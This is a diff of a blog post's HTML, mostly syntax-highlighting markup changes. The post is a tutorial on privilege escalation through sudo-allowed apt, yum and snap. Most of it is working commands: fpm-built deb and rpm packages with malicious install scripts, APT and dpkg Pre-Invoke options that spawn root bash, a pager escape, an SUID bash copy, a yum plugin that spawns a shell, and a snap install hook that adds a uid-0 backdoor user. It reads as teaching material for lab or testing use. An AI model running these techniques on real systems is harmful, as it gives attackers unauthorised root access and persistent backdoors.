@@ -38,27 +38,27 @@ above package managers as sudo.&lt;/p>
 &lt;h3 id="method-1-creating-a-malicious-debian-package">Method 1: Creating a malicious debian package&lt;/h3>
 &lt;p>The low privileged user can create a debian package that contains commands to escalate the privileges.&lt;/p>
 &lt;p>To start off we&amp;rsquo;ll create a directory called &lt;code>exploit&lt;/code> then create a shell script that runs &lt;code>whoami&lt;/code> command and put in the folder.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">mkdir exploit
-echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt; exploit/exploit.sh
-echo whoami &amp;gt;&amp;gt; exploit/exploit.sh
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>mkdir exploit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt; exploit/exploit.sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo whoami &amp;gt;&amp;gt; exploit/exploit.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-2.png" class="center" style="border-radius: 8px;" />
 &lt;p>With that ready we&amp;rsquo;ll use a tool called fpm (Effing package management) to build a debian package that will execute
 the script we have just created.&lt;/p>
 &lt;p>To create the debian package we&amp;rsquo;ll run the below fpm command:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t deb --before-install ./exploit/exploit.sh ./exploit
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>fpm -n exploit -s dir -t deb --before-install ./exploit/exploit.sh ./exploit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-3.png" class="center" style="border-radius: 8px;" />
 &lt;p>Next we install the package via apt using the below command:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt install ./exploit_1.0_amd64.deb
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo apt install ./exploit_1.0_amd64.deb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-4.png" class="center" style="border-radius: 8px;" />
 &lt;p>There we see the command gets executed as root, now we can run any command as root. From there you can use different
 strategies to get a root shell like adding ssh keys to the root user or getting a reverse shell.&lt;/p>
 &lt;p>For our case here, we&amp;rsquo;ll just change the &lt;code>whoami&lt;/code> command to &lt;code>bash&lt;/code> in the exploit.sh script then create a new
 debian package. But this time specify a new version to upgrade the existing one that we installed.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t deb -v 1.1 --before-install ./exploit/exploit.sh ./exploit
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>fpm -n exploit -s dir -t deb -v 1.1 --before-install ./exploit/exploit.sh ./exploit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-5.png" class="center" style="border-radius: 8px;" />
 &lt;p>We&amp;rsquo;ve successfully got an interactive shell as root. This also applies to apt-get and dpkg.&lt;/p>
 &lt;h3 id="method-2-apt-configuration-options">Method 2: APT Configuration Options&lt;/h3>
@@ -70,19 +70,19 @@ in the case where you are trying to escalate privileges the low privileged user 
 in that directory.&lt;/p>
 &lt;p>APT supports specifying this configurations on the commandline as well by using the &lt;code>-o&lt;/code> option. Using this we can run the following
 commands to get a root shell.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt update -o APT::Update::Pre-Invoke::&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo apt update -o APT::Update::Pre-Invoke::&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-6.png" class="center" style="border-radius: 8px;" />
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt update -o APT::Update::Post-Invoke::&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo apt update -o APT::Update::Post-Invoke::&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-7.png" class="center" style="border-radius: 8px;" />
 &lt;p>Since apt interacts with dpkg we can also use dpkg like configurations to get a root shell but a bit differently.
 We can&amp;rsquo;t pass dpkg configurations directly to apt&amp;rsquo;s commandline options therefore we need to use a configuration file.&lt;/p>
 &lt;p>APT allows us to specify a configuration file to use in addition to the default configuration via command line option &lt;code>-c&lt;/code>.&lt;/p>
 &lt;p>Let&amp;rsquo;s create a malicious config file and use it.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">echo &lt;span style="color:#e6db74">&amp;#39;Dpkg::Pre-Invoke {&amp;#34;/bin/bash&amp;#34;}&amp;#39;&lt;/span> &amp;gt; badconfig
-sudo apt install -c badconfig netcat
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;Dpkg::Pre-Invoke {&amp;#34;/bin/bash&amp;#34;}&amp;#39;&lt;/span> &amp;gt; badconfig
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt install -c badconfig netcat
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-8.png" class="center" style="border-radius: 8px;" />
 &lt;p>For the above to work the package you choose should not be presently installed on the system.&lt;/p>
 &lt;p>The techniques here also work with apt-get.&lt;/p>
@@ -90,9 +90,9 @@ sudo apt install -c badconfig netcat
 &lt;p>When viewing changelog, apt/apt-get will display it using sensible-pager which is usually set to &lt;code>less&lt;/code> by default. This means that apt
 will run less and because less will also be running as root we can get a root shell from it.&lt;/p>
 &lt;p>Run the first command then when in the pager interface, run the second command. This also works with apt-get.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt changelog apt
-!/bin/bash
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploitation-rpm">Exploitation: RPM&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo apt changelog apt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>!/bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploitation-rpm">Exploitation: RPM&lt;/h2>
 &lt;p>Here I have a centos 7 server. Similar to above section we start with a low privileged user that can run &lt;code>yum&lt;/code> as sudo.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-9.png" class="center" style="border-radius: 8px;" />
 &lt;h3 id="method-1-creating-a-malicious-rpm-package">Method 1: Creating a malicious rpm package&lt;/h3>
@@ -101,27 +101,28 @@ package then transfer it to the centos server.&lt;/p>
 &lt;p>In this case dropping into a shell doesn&amp;rsquo;t work, we therefore need to run a command that will give us shell access differently. I will create an
 suid bash binary that will give us root access.&lt;/p>
 &lt;p>We&amp;rsquo;ll create the exploit folder and exploit.sh script inside of /tmp. Then put the below command in the script.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cd /tmp
-mkdir exploit
-echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt; exploit/exploit.sh
-echo &lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; exploit/exploit.sh
-echo &lt;span style="color:#e6db74">&amp;#39;chmod +xs /tmp/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; exploit/exploit.sh
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cd /tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir exploit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt; exploit/exploit.sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; exploit/exploit.sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;chmod +xs /tmp/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; exploit/exploit.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-10.png" class="center" style="border-radius: 8px;" />
 &lt;p>Now we&amp;rsquo;ll create the malicious rpm package using a similar command to the debian package.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t rpm --before-install ./exploit/exploit.sh ./exploit
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>fpm -n exploit -s dir -t rpm --before-install ./exploit/exploit.sh ./exploit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-11.png" class="center" style="border-radius: 8px;" />
 &lt;p>Then we can transfer it to the centos server by launching a python http server and downloading it.&lt;/p>
 &lt;p>on ubuntu server:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">python3 -m http.server
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>on centos server:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget http://192.168.125.10:8000/exploit-1.0-1.x86_64.rpm
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once successfully downloaded we will install the package and the included script will be executed to create our
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>python3 -m http.server
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>on centos server:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wget http://192.168.125.10:8000/exploit-1.0-1.x86_64.rpm
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once successfully downloaded we will install the package and the included script will be executed to create our
 suid bash binary.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo yum localinstall -y exploit-1.0-1.x86_64.rpm
-/tmp/bash -p
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo yum localinstall -y exploit-1.0-1.x86_64.rpm
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/tmp/bash -p
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-12.png" class="center" style="border-radius: 8px;" />
 &lt;p>We have successfully gained a root shell.&lt;/p>
 &lt;h3 id="method-2-loading-a-custom-yum-plugin">Method 2: Loading a custom yum plugin&lt;/h3>
@@ -164,30 +165,30 @@ enabled = 1
 configuration file that specifies directories we have permission to write.&lt;/p>
 &lt;p>Fortunately, yum allows us to specify a configuration file via the commandline via the &lt;code>-c&lt;/code> option. Let&amp;rsquo;s create a configuration
 file called &lt;code>custom_yum.conf&lt;/code> with the below contents.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cd /tmp
-cat &amp;gt;custom_yum.conf&lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;span style="color:#e6db74">[main]
-&lt;/span>&lt;span style="color:#e6db74">plugins=1
-&lt;/span>&lt;span style="color:#e6db74">pluginpath=/tmp/badplugin
-&lt;/span>&lt;span style="color:#e6db74">pluginconfpath=/tmp/badplugin
-&lt;/span>&lt;span style="color:#e6db74">EOF&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next let&amp;rsquo;s create the plugin configuration file, but put it in the badplugin folder.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">mkdir badplugin
-cat &amp;gt;badplugin/badplugin.conf&lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;span style="color:#e6db74">[main]
-&lt;/span>&lt;span style="color:#e6db74">enabled=1
-&lt;/span>&lt;span style="color:#e6db74">EOF&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then create the plugin itself.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">cat &lt;span style="color:#f92672">&amp;gt;&lt;/span>badplugin&lt;span style="color:#f92672">/&lt;/span>badplugin&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span>EOF
-&lt;span style="color:#f92672">import&lt;/span> os
-&lt;span style="color:#f92672">from&lt;/span> yum.plugins &lt;span style="color:#f92672">import&lt;/span> PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE, API_VERSION
-requires_api_version&lt;span style="color:#f92672">=&lt;/span>API_VERSION
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">init_hook&lt;/span>(conduit):
-os&lt;span style="color:#f92672">.&lt;/span>execl(&lt;span style="color:#e6db74">&amp;#39;/bin/bash&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;/bin/bash&amp;#39;&lt;/span>)
-EOF
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally we can execute the plugin with the below command and get a root shell.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo yum -c custom_yum.conf
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cd /tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat &amp;gt;custom_yum.conf&lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">[main]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">plugins=1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">pluginpath=/tmp/badplugin
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">pluginconfpath=/tmp/badplugin
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next let&amp;rsquo;s create the plugin configuration file, but put it in the badplugin folder.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>mkdir badplugin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat &amp;gt;badplugin/badplugin.conf&lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">[main]
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">enabled=1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then create the plugin itself.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#f92672">&amp;gt;&lt;/span>badplugin&lt;span style="color:#f92672">/&lt;/span>badplugin&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span>EOF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> yum.plugins &lt;span style="color:#f92672">import&lt;/span> PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE, API_VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>requires_api_version&lt;span style="color:#f92672">=&lt;/span>API_VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">init_hook&lt;/span>(conduit):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os&lt;span style="color:#f92672">.&lt;/span>execl(&lt;span style="color:#e6db74">&amp;#39;/bin/bash&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;/bin/bash&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>EOF
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally we can execute the plugin with the below command and get a root shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo yum -c custom_yum.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-20.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="exploitation-snap">Exploitation: Snap&lt;/h2>
 &lt;p>As snap works on all major distros, I&amp;rsquo;ll be showcasing this on our ubuntu server. The low privileged user has the
@@ -211,43 +212,43 @@ actions, such as an early initialisation of a resource when installed for the fi
 install the package.&lt;/p>
 &lt;h4 id="1-snapcraft">1. Snapcraft&lt;/h4>
 &lt;p>Let&amp;rsquo;s setup our environment.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">mkdir exploit
-cd exploit
-snapcraft init
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>The snapcraft init command create a &lt;code>snap&lt;/code> directory and the file &lt;code>snapcraft.yaml&lt;/code> inside it.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>mkdir exploit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cd exploit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>snapcraft init
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The snapcraft init command create a &lt;code>snap&lt;/code> directory and the file &lt;code>snapcraft.yaml&lt;/code> inside it.&lt;/p>
 &lt;p>Next change into the snap directory then create a &lt;code>hooks&lt;/code> directory and &lt;code>install&lt;/code> file inside.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cd snap
-mkdir hooks
-touch hooks/install
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we will put our malicious commands in the install file and make it and executable bash script.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cd snap
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir hooks
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>touch hooks/install
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we will put our malicious commands in the install file and make it and executable bash script.&lt;/p>
 &lt;p>Since our goal is to obtain a root shell, we will use another technique of adding a new user with uid 0 to give us
 root privileges. You can also use a reverse shell command.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>/usr/sbin/useradd -p &lt;span style="color:#66d9ef">$(&lt;/span>openssl passwd -1 password123&lt;span style="color:#66d9ef">)&lt;/span> -u &lt;span style="color:#ae81ff">0&lt;/span> -o -s /bin/bash -m pwned
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Don&amp;rsquo;t forget to make the script executable.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">chmod +x hooks/install
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s edit the snapcraft.yaml file, we&amp;rsquo;ll change the default name, summary and description and also delete the base entry.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">exploit&lt;/span> &lt;span style="color:#75715e"># you probably want to &amp;#39;snapcraft register &amp;lt;name&amp;gt;&amp;#39;&lt;/span>
-&lt;span style="color:#f92672">version&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;0.1&amp;#39;&lt;/span> &lt;span style="color:#75715e"># just for humans, typically &amp;#39;1.2+git&amp;#39; or &amp;#39;1.3.2&amp;#39;&lt;/span>
-&lt;span style="color:#f92672">summary&lt;/span>: &lt;span style="color:#ae81ff">privesc exploit&lt;/span>
-&lt;span style="color:#f92672">description&lt;/span>: |&lt;span style="color:#e6db74">
-&lt;/span>&lt;span style="color:#e6db74"> privesc exploit
-&lt;/span>&lt;span style="color:#e6db74">
-&lt;/span>&lt;span style="color:#e6db74"> grade: devel # must be &amp;#39;stable&amp;#39; to release into candidate/stable channels
-&lt;/span>&lt;span style="color:#e6db74"> confinement: devmode # use &amp;#39;strict&amp;#39; once you have the right plugs and slots
-&lt;/span>&lt;span style="color:#e6db74">
-&lt;/span>&lt;span style="color:#e6db74"> parts:
-&lt;/span>&lt;span style="color:#e6db74"> my-part:
-&lt;/span>&lt;span style="color:#e6db74"> # See &amp;#39;snapcraft plugins&amp;#39;&lt;/span>
-&lt;span style="color:#f92672">plugin&lt;/span>: &lt;span style="color:#ae81ff">nil&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s move back into the &lt;code>exploit&lt;/code> directory and then run &lt;code>snapcraft&lt;/code> command to create the package then install it.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo snap install --dangerous --devmode exploit_0.1_amd64.snap
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once installed we see our user has been added and we can switch user and get the root shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>/usr/sbin/useradd -p &lt;span style="color:#66d9ef">$(&lt;/span>openssl passwd -1 password123&lt;span style="color:#66d9ef">)&lt;/span> -u &lt;span style="color:#ae81ff">0&lt;/span> -o -s /bin/bash -m pwned
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Don&amp;rsquo;t forget to make the script executable.&lt;/p>
